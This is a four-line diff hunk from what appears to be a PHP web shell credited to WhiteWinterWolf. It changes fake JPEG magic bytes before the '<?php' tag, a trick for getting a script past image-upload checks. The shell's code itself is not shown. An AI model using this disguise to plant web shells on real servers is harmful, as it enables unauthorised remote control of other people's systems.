@@ -1,4 +1,4 @@
-ÿÙ#<?php
+ÿØÿî#<?php
 /*******************************************************************************
  * Copyright 2017 WhiteWinterWolf
  * https://www.whitewinterwolf.com/tags/php-webshell/
